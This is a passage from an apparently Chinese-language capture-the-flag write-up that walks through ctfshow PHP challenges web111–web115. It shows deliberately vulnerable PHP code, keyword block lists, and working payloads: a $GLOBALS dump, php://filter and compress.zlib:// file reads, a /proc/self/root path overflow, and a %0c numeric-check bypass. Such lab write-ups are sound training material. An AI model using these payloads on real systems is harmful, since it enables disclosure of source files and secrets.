</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$v1</span><span class="p">,</span><span class="o">&amp;</span><span class="nv">$v2</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;$</span><span class="si">$v1</span><span class="s2"> = &amp;$</span><span class="si">$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$$v1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfshow/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="nx">getFlag</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$v2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">   
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜æ˜¯å…³äºå˜é‡è¦†ç›–çš„é¢˜ç›®</p>
<p>ç”±äº</p>
<pre tabindex="0"><code>if(preg_match(&#39;/ctfshow/&#39;, $v1)){
            getFlag($v1,$v2);
    }
</code></pre><p>æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ç¡®å®šv1çš„å€¼åªèƒ½ä¸ºctfshow</p>
<p>æ¥ä¸‹æ¥çœ‹getFlagå‡½æ•°</p>
<pre tabindex="0"><code>function getFlag(&amp;$v1,&amp;$v2){
    eval(&#34;$$v1 = &amp;$$v2;&#34;);
    var_dump($$v1);
}
</code></pre><p>getFlagå‡½æ•°ä¼šå°†v1çš„åœ°å€æŒ‡å‘v2ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šä½¿v1çš„å€¼ç­‰äºv2</p>
<p>var_dumpåˆ™ä¼šè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯</p>
<p>é‚£æˆ‘ä»¬åªéœ€è¦ä½¿v2çš„å€¼ç­‰äºæˆ‘ä»¬è¦æŸ¥è¯¢çš„å˜é‡å°±å¯ä»¥è¯»åˆ°æˆ‘ä»¬çš„flag</p>
<p>ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬ä¸çŸ¥é“è¦æŸ¥çš„å˜é‡æ˜¯ä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯åœ¨ä½œç”¨åŸŸé‡Œé¢</p>
<p>æ‰€è¿™é‡Œä½¿ç”¨è¶…å…¨å±€å˜é‡ $GLOBALSï¼Œ$GLOBALS æ˜¯PHPçš„ä¸€ä¸ªè¶…çº§å…¨å±€å˜é‡ç»„ï¼ŒåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ï¼Œå˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p>
<p>æ„é€ payloadæŠŠæ‰€æœ‰å…¨å±€å˜é‡å…¨è¾“å‡ºæ¥</p>
<pre tabindex="0"><code>https://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow&amp;v2=GLOBALS
</code></pre><p><img alt="image-20250106003832148" loading="lazy" src="assets/image-20250106003832148.png"></p>
<h4 id="web112">web112<a hidden class="anchor" aria-hidden="true" href="#web112">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 23:47:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;hacker!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯phpä¼ªåè®®ï¼Œè™½ç„¶è¢«banäº†dataã€input ç­‰ä¼ªåè®®ï¼Œåˆbanäº† stringã€dataã€rot13 ç›¸å…³çš„è¿‡æ»¤å™¨ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸å°‘èƒ½ç”¨çš„ä¼ªåè®®å’Œè¿‡æ»¤å™¨</p>
<p>å¦‚ php://filterï¼ˆè¿™é‡Œä¹Ÿç”¨ä¸åˆ°è¿‡æ»¤å™¨ï¼‰</p>
<pre tabindex="0"><code>https://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php
</code></pre><p>å…¶ä»–</p>
<pre tabindex="0"><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
compress.zlib://flag.php
</code></pre><p><strong>ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥è¾“å…¥flag.phpå‘¢?</strong></p>
<pre tabindex="0"><code>if(!is_file($file)){
    highlight_file(filter($file));
}else{
    echo &#34;hacker!&#34;;
}
</code></pre><p>é‚£æ˜¯å› ä¸ºis_file(&ldquo;flag.php&rdquo;)==trueï¼Œè¾“å‡ºhackerï¼</p>
<h4 id="web113">web113<a hidden class="anchor" aria-hidden="true" href="#web113">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 23:47:52
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜ç›¸æ¯”ä¸Šé¢˜æŠŠfilterè¿‡æ»¤äº†</p>
<p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨å…¶ä»–ä¼ªåè®®</p>
<p>å¦‚ compress.zlib://</p>
<pre tabindex="0"><code>compress.zlib://flag.php
</code></pre><p><strong>å®˜æ–¹é¢˜è§£</strong> ç›®å½•æº¢å‡ºå¯¼è‡´is_fileè®¤ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶</p>
<pre tabindex="0"><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
</code></pre><h4 id="web114">web114<a hidden class="anchor" aria-hidden="true" href="#web114">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 15:02:53
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">echo</span> <span class="s2">&#34;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜banæ‰äº†compresså’Œrootæ²¡åŠæ³•ä½¿ç”¨ä¸Šé¢˜çš„ä¸¤ç§è§£æ³•ï¼Œä½†æ˜¯æŠŠfilteræ”¾å‡ºæ¥äº†</p>
<pre tabindex="0"><code>php://filter/resource=flag.php
</code></pre><p>ç›´æ¥è¯»å°±å®Œäº‹äº†</p>
<h4 id="web115">web115<a hidden class="anchor" aria-hidden="true" href="#web115">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 15:08:19
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$num</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;e&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="nv">$num</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nv">$num</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$num</span><span class="o">!==</span><span class="s1">&#39;36&#39;</span> <span class="k">and</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span><span class="o">!==</span><span class="s1">&#39;36&#39;</span> <span class="k">and</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;36&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="s1">&#39;36&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;hacker!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å‚è€ƒæ–‡ç« :<a href="https://blog.csdn.net/m0_48780534/article/details/125523030">ctfshowå­¦ä¹ è®°å½•-webå…¥é—¨ï¼ˆphpç‰¹æ€§109-115&amp;123&amp;125-126ï¼‰_ctfshow web109-CSDNåšå®¢</a></p>
<p>is_numericå¯ä»¥åœ¨æ•°å­—å‰é¢åŠ ç©ºæ ¼ç»•è¿‡ï¼ŒåŒæ—¶åŠ ä¸Šç©ºæ ¼ä¹Ÿå¯ä»¥ç»•è¿‡$num!=&lsquo;36&rsquo;</p>
<p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“trimå‡½æ•°æ˜¯ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œç©ºæ ¼ç­‰å­—ç¬¦æ˜¯ä¼šè¢«å»æ‰çš„</p>
<p>æˆ‘ä»¬è¿™é‡Œè€ƒè™‘ä½¿ç”¨%0cï¼ˆæ¢é¡µç¬¦ï¼‰è¿›è¡Œç»•è¿‡</p>
<p>åŒæ—¶ä½¿ç”¨%0cä¹Ÿå¯ä»¥ç»•è¿‡filterã€‚</p>
<p>æ¥ä¸‹æ¥å†çœ‹ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œè¿™æ˜¯çœ‹èµ·æ¥å¾ˆçŸ›ç›¾çš„ä¸€ä¸ªåˆ¤æ–­ã€‚</p>
<p>æ¥å…·ä½“çœ‹ä¸€ä¸‹!==çš„å®šä¹‰ï¼Œåªè¦ç±»å‹ä¸åŒå°±ä¸å…¨ç­‰ã€‚</p>
<p><img alt="phpæ¯”è¾ƒ" loading="lazy" src="https://i-blog.csdnimg.cn/blog_migrate/fa3b23f0144b0dff5e00bdc93fabdf3b.png"></p>
<blockquote>
<p>å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œã€‚æ­¤è§„åˆ™ä¹Ÿé€‚ç”¨äº switch è¯­å¥ã€‚å½“ç”¨ === æˆ– !== è¿›è¡Œæ¯”è¾ƒæ—¶åˆ™ä¸è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå› ä¸ºæ­¤æ—¶ç±»å‹å’Œæ•°å€¼éƒ½è¦æ¯”å¯¹ã€‚
â€”â€”ã€Šphpæ‰‹å†Œã€‹è¯­è¨€å‚è€ƒ-è¿ç®—ç¬¦-æ¯”è¾ƒè¿ç®—ç¬¦</p></blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´!==æ—¶ä¸è¿›è¡Œç±»å‹è½¬æ¢ã€‚</p>
<p>æ‰€ä»¥åŠ ä¸Š%0cæ¢é¡µç¬¦ï¼Œåœ¨==è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€æœ‰%0c36ä¼šè¢«è½¬æ¢ä¸ºæ•°å€¼36ï¼Œç»“æœtrueï¼›åœ¨!==ä¸è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²å’Œæ•°å€¼æ¯”è¾ƒï¼Œç±»å‹ä¸åŒï¼Œç»“æœtrueã€‚</p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>?num=%0c36
</code></pre><h4 id="web123">web123<a hidden class="anchor" aria-hidden="true" href="#web123">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
